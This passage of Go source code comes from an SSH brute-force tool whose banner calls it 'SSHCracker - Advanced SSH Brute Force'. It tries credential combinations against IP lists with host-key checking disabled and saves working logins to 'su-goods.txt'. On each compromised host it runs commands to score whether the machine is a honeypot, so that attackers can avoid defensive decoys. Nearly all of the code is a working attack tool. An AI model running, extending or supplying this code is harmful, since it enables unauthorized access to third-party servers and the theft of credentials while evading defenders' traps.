		if !strings.Contains(output, "not found") && len(strings.TrimSpace(output)) > 0 {
			workingPMs++
		}
	}
	
	// If no package manager exists, it's suspicious
	if workingPMs == 0 {
		score++
	}
	
	// Test 4: Check system services
	services := executeCommand(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
	if strings.Contains(services, "0 loaded units") || len(strings.TrimSpace(services)) < 50 {
		score++
	}
	
	// Test 5: Check internet access
	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
	if len(strings.TrimSpace(internetTest)) == 0 {
		// May not have internet access (suspicious for honeypot)
		score++
	}
	
	return score
}

// Performance and system behavior tests
func performanceTests(client *ssh.Client) int {
	score := 0
	
	// I/O speed test
	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
	if strings.Contains(ioTest, "command not found") {
		// Time analysis - if command not found it's suspicious
		score++
	}
	
	// Clean up test file
	executeCommand(client, "rm -f /tmp/test")
	
	// Internal network test
	networkTest := executeCommand(client, "ss -tuln 2>/dev/null | wc -l")
	if networkTest != "" {
		if count, err := strconv.Atoi(strings.TrimSpace(networkTest)); err == nil {
			if count < 5 { // Low network connection count
				score++
			}
		}
	}
	
	return score
}

// Detect abnormal patterns
func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	
	// Check hostname
	if hostname := serverInfo.Hostname; hostname != "" {
		// Only check for truly suspicious hostnames
		// Removed "GNU/Linux" and "PREEMPT_DYNAMIC" - these are common in real systems
		suspiciousHostnames := []string{
			"honeypot", "fake", "trap", "sandbox",
			"simulation", "decoy", "honey",
		}
		
		lowerHostname := strings.ToLower(hostname)
		for _, suspicious := range suspiciousHostnames {
			if strings.Contains(lowerHostname, suspicious) {
				score++
			}
		}
	}
	
	// Check uptime
	uptimeOutput, exists := serverInfo.Commands["uptime"]
	if exists {
		// If uptime is very low (less than 1 hour) or command not found, it's suspicious
		if strings.Contains(uptimeOutput, "0:") || 
		   strings.Contains(uptimeOutput, "min") || 
		   strings.Contains(uptimeOutput, "command not found") {
			score++
		}
	}
	
	// Check command history
	historyOutput, exists := serverInfo.Commands["history"]
	if exists {
		lines := strings.Split(strings.TrimSpace(historyOutput), "\n")
		// Very little or empty history
		if len(lines) < 3 {
			score++
		}
	}
	
	return score
}

// Log successful connection
func logSuccessfulConnection(serverInfo *ServerInfo) {
	successMessage := fmt.Sprintf("%s:%s@%s:%s", 
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
	
	// Save to main file
	appendToFile(successMessage+"\n", "su-goods.txt")
	
	// Save detailed information to separate file
	detailedInfo := fmt.Sprintf(`
=== 🎯 SSH Success 🎯 ===
🌐 Target: %s:%s
🔑 Credentials: %s:%s
🖥️ Hostname: %s
🐧 OS: %s
📡 SSH Version: %s
⚡ Response Time: %v
🔌 Open Ports: %v
🍯 Honeypot Score: %d
🕒 Timestamp: %s
========================
`, 
		serverInfo.IP, serverInfo.Port,
		serverInfo.Username, serverInfo.Password,
		serverInfo.Hostname,
		serverInfo.OSInfo,
		serverInfo.SSHVersion,
		serverInfo.ResponseTime,
		serverInfo.OpenPorts,
		serverInfo.HoneypotScore,
		time.Now().Format("2006-01-02 15:04:05"),
	)
	
	appendToFile(detailedInfo, "detailed-results.txt")
	
	// Display success message in console
	fmt.Printf("✅ SUCCESS: %s\n", successMessage)
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	const boxWidth = 62 // Inner width (excluding borders)

	for range ticker.C {
		// Check if paused
		if IsPaused() {
			return
		}

		// Use atomic operations for thread-safe reading
		goods := atomic.LoadInt64(&stats.goods)
		errors := atomic.LoadInt64(&stats.errors)
		honeypots := atomic.LoadInt64(&stats.honeypots)
		
		totalConnections := int(goods + errors + honeypots)
		elapsedTime := time.Since(startTime).Seconds()
		
		// Avoid division by zero
		var connectionsPerSecond float64
		var estimatedRemainingTime float64
		if elapsedTime > 0 && totalConnections > 0 {
			connectionsPerSecond = float64(totalConnections) / elapsedTime
			estimatedRemainingTime = float64(totalIPCount-totalConnections) / connectionsPerSecond
			if estimatedRemainingTime < 0 {
				estimatedRemainingTime = 0
			}
		}

		clear()

		// Top border
		fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
		
		// Title
		printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Advanced SSH Brute Force 🚀", VERSION), boxWidth)
		
		// Separator
		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
		
		// File info
		printBoxLine(fmt.Sprintf("📁 File: %s", truncateString(ipFile, 50)), boxWidth)
		printBoxLine(fmt.Sprintf("⏱️ Timeout: %ds | 👷 Workers: %d | 🎯 Per Worker: %d", timeout, maxConnections, CONCURRENT_PER_WORKER), boxWidth)
		
		// Separator
		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
		
		// Progress
		progressPct := float64(totalConnections) / float64(totalIPCount) * 100
		printBoxLine(fmt.Sprintf("🔍 Progress: %8d / %8d (%5.1f%%)", totalConnections, totalIPCount, progressPct), boxWidth)
		printBoxLine(fmt.Sprintf("⚡ Speed: %.1f checks/sec", connectionsPerSecond), boxWidth)
		
		if totalConnections < totalIPCount {
			remainingStr := "calculating..."
			if connectionsPerSecond > 0 {
				remainingStr = formatTime(estimatedRemainingTime)
			}
			printBoxLine(fmt.Sprintf("⏳ Elapsed: %s | ⏰ ETA: %s", formatTime(elapsedTime), remainingStr), boxWidth)
		} else {
			printBoxLine(fmt.Sprintf("⏳ Total Time: %s", formatTime(elapsedTime)), boxWidth)
			printBoxLine("✅ Scan Completed Successfully!", boxWidth)
		}
		
		// Separator
		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
		
		// Stats
		printBoxLine(fmt.Sprintf("✅ Successful: %d | ❌ Failed: %d | 🍯 Honeypots: %d", goods, errors, honeypots), boxWidth)
		
		if totalConnections > 0 {
			successfulConnections := goods + honeypots
			if successfulConnections > 0 {
				printBoxLine(fmt.Sprintf("📊 Success Rate: %.1f%% | 🍯 Honeypot Rate: %.1f%%", 
					float64(goods)/float64(successfulConnections)*100,
					float64(honeypots)/float64(successfulConnections)*100), boxWidth)
			}
		}
		
		// Separator
		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
		printBoxLine("💡 Press Ctrl+C to pause and save progress", boxWidth)
		
		// Separator
		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
		printBoxLine("💻 Developer: SudoLite | GitHub & Twitter: @sudolite", boxWidth)
		
		// Bottom border
		fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")

		if totalConnections >= totalIPCount {
			return
		}
	}
}

// Print a line inside the box with proper padding
func printBoxLine(content string, boxWidth int) {
	// Calculate visible length (accounting for emojis and wide chars)
	visibleLen := getVisibleLength(content)
	padding := boxWidth - visibleLen - 2 // -2 for leading space after ║
	if padding < 0 {
		padding = 0
	}
	fmt.Printf("║ %s%s ║\n", content, strings.Repeat(" ", padding))
}

// Get visible length of string - more accurate emoji detection
func getVisibleLength(s string) int {
	length := 0
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		// Emoji ranges (most common ones used in the app)
		if (r >= 0x1F300 && r <= 0x1F9FF) || // Misc Symbols, Emoticons, etc
		   (r >= 0x2600 && r <= 0x26FF) ||   // Misc Symbols
		   (r >= 0x2700 && r <= 0x27BF) ||   // Dingbats
		   (r >= 0x1F600 && r <= 0x1F64F) || // Emoticons
		   (r >= 0x1F680 && r <= 0x1F6FF) || // Transport/Map symbols
		   r == 0x231A || r == 0x231B ||     // Watch, Hourglass
		   r == 0x23F0 || r == 0x23F3 ||     // Alarm clock, Hourglass
		   r == 0x2705 || r == 0x274C ||     // Check, X mark
		   r == 0xFE0F {                      // Variation selector
			length += 2
		} else if r > 127 {
			// Other non-ASCII (like ═, ║, •, etc)
			length += 1
		} else {
			length += 1
		}
	}
	return length
}

// Truncate string to max length
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// Pad string to left
func padLeft(s string, length int) string {
	if len(s) >= length {
		return s
	}
	return strings.Repeat(" ", length-len(s)) + s
}

func formatTime(seconds float64) string {
	days := int(seconds) / 86400
	hours := (int(seconds) % 86400) / 3600
	minutes := (int(seconds) % 3600) / 60
	seconds = math.Mod(seconds, 60)
	return fmt.Sprintf("%02d:%02d:%02d:%02d", days, hours, minutes, int(seconds))
}

func appendToFile(data, filepath string) {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Failed to open file for append: %s", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		log.Printf("Failed to write to file: %s", err)
	}
}

// Calculate optimal buffer sizes based on worker capacity
func calculateOptimalBuffers() int {
	// Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (Safety factor)
	taskBuffer := int(float64(maxConnections * CONCURRENT_PER_WORKER) * 1.5)
	
	return taskBuffer
}

// Enhanced worker pool system with resume support
func setupEnhancedWorkerPoolWithResume(combos [][]string, ips [][]string, resumeFrom int64) {
	// Calculate optimal buffer sizes using enhanced algorithm
	taskBufferSize := calculateOptimalBuffers()
	
	// Create channels with calculated buffer sizes
	taskQueue := make(chan SSHTask, taskBufferSize)
	
	var wg sync.WaitGroup
	
	// Start main workers
	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorkerWithPause(i, taskQueue, &wg)
	}
	
	// Start progress banner
	go banner()
	
	// Generate and send tasks with resume support
	go func() {
		taskIdx := int64(0)
		for _, combo := range combos {
			for _, ip := range ips {
				// Skip tasks before resume point
				if taskIdx < resumeFrom {
					taskIdx++
					continue
				}

				// Check for pause signal
				if IsPaused() {
					close(taskQueue)
					return
				}

				// Handle IP with or without port
				ipAddr := ip[0]
				port := "22"
				if len(ip) > 1 && ip[1] != "" {
					port = ip[1]
				}

				task := SSHTask{
					IP:       ipAddr,
					Port:     port,
					Username: combo[0],
					Password: combo[1],
				}

				atomic.StoreInt64(&currentTaskIndex, taskIdx)
				taskQueue <- task
				taskIdx++
			}
			if IsPaused() {
				close(taskQueue)
				return
			}
		}
		close(taskQueue)
	}()
	
	// Wait for all workers to complete
	wg.Wait()
}

// Legacy function for compatibility
func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
	setupEnhancedWorkerPoolWithResume(combos, ips, 0)
}

// Enhanced main worker with pause support
func enhancedMainWorkerWithPause(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	
	// Semaphore to limit concurrent connections per worker
	semaphore := make(chan struct{}, CONCURRENT_PER_WORKER)
	var workerWg sync.WaitGroup
	
	for task := range taskQueue {
		// Check pause before starting new task
		if IsPaused() {
			break
		}

		workerWg.Add(1)
		semaphore <- struct{}{} // Acquire semaphore
		
		go func(t SSHTask) {
			defer workerWg.Done()
			defer func() { <-semaphore }() // Release semaphore
			
			processSSHTask(t)
		}(task)
	}
	
	workerWg.Wait() // Wait for all concurrent tasks to complete
}

// Legacy function for compatibility  
func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
	enhancedMainWorkerWithPause(workerID, taskQueue, wg)
}

// Process individual SSH task
func processSSHTask(task SSHTask) {
	// SSH connection configuration (same as original)
	config := &ssh.ClientConfig{
		User: task.Username,
		Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: time.Duration(timeout) * time.Second,
	}
	
	connectionStartTime := time.Now()
	
	// Test connection (same error handling as original)
	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
	if err == nil {
		defer client.Close()
		
		// Check if this IP:port combination has already been processed
		successKey := fmt.Sprintf("%s:%s", task.IP, task.Port)
		mapMutex.Lock()
		if _, exists := successfulIPs[successKey]; exists {
			mapMutex.Unlock()
			return // Skip this IP:port since it's already been processed
		}
		// Mark as processed immediately to prevent other workers from processing it
		successfulIPs[successKey] = struct{}{}
		mapMutex.Unlock()
		
		// Create server information
		serverInfo := &ServerInfo{
			IP:           task.IP,
			Port:         task.Port,
			Username:     task.Username,
			Password:     task.Password,
			ResponseTime: time.Since(connectionStartTime),
			Commands:     make(map[string]string),
		}
		
		// Honeypot detector
		detector := &HoneypotDetector{
			TimeAnalysis:    true,
			CommandAnalysis: true,
			NetworkAnalysis: true,
		}
		
		// Gather system information first
		gatherSystemInfo(client, serverInfo)
		
		// Run full honeypot detection (all 9 algorithms) with valid client
		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
		
		// Record result based on honeypot detection
		if !serverInfo.IsHoneypot {
			atomic.AddInt64(&stats.goods, 1)
			logSuccessfulConnection(serverInfo)
		} else {
			atomic.AddInt64(&stats.honeypots, 1)
			log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
			appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
				serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
		}
	} else {
		// Same error handling as original
		atomic.AddInt64(&stats.errors, 1)
	}
}